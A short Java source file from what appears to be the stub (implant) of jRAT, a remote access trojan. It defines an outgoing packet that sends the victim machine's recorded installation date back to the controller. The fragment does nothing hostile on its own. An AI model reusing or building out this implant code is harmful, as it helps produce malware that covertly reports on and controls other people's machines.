package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;
import io.jrat.stub.Configuration;

import java.io.DataOutputStream;


public class Packet11InitInstallationDate extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		String date = Configuration.getInstallationDate();
		
		if (date == null) {
			date = "Unknown";
		}
		
		sw.writeLine(date);
	}

	@Override
	public short getPacketId() {
		return (byte) 11;
	}

}
